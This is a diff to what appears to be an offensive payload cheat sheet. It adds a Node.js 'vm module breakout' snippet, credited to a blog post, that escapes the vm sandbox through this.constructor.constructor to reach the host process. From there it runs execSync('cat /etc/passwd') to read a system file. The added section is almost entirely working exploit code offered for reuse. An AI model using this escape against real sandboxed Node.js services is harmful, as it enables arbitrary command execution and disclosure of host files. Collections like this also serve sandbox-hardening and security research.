@@ -94,6 +94,16 @@ print(resp.stdout);
 print(resp.stderr);
 ```
 
+vm module breakout (by [pwnisher](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html))
+
+```
+"use strict";
+const vm = require("vm");
+const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
+process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()`);
+console.log(xyz);
+```
+
 ### Need More ?
 Repository would be mainted time to time. Feel free to contribute.
 
